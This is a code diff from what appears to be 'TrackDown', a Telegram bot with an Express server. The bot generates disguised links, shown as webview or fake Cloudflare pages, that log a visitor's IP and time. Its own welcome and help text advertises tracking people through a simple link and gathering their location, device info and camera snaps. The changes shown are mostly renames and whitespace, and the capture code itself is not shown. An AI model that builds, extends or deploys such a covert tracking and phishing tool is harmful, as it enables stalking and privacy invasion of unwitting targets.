@@ -11,7 +11,6 @@ app.use(jsonParser);
 app.use(urlencodedParser);
 app.set("view engine", "ejs");
 
-//Replace it with your repl URL or website url
 
 var hostURL="https://nsss.repl.co"
 
@@ -31,7 +30,9 @@ res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path}
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
 }
-                       
+
+         
+                              
 });
 
 app.get("/c/:path/:uri",(req,res)=>{
@@ -46,13 +47,17 @@ res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.pa
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
-}                            
+}
+
+         
+                              
 });
 
 
 
 bot.on('message', (msg) => {
 const chatId = msg.chat.id;
+
 
 if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
@@ -66,7 +71,7 @@ reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_da
 bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
-ur(chatId);
+createNew(chatId);
 }
 else if(msg.text=="/help"){
 bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
@@ -79,6 +84,8 @@ the url it will send you 2 links which you can use to track people.
 \n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
 `);
 }
+  
+  
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
@@ -113,7 +120,7 @@ bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n�
 }
 else{
 bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
-ur(cid);
+createNew(cid);
 
 }  
 }
@@ -206,4 +213,4 @@ res.send("Done");
 
 app.listen(5000, () => {
 console.log("App Running on Port 5000!");
-})
+});
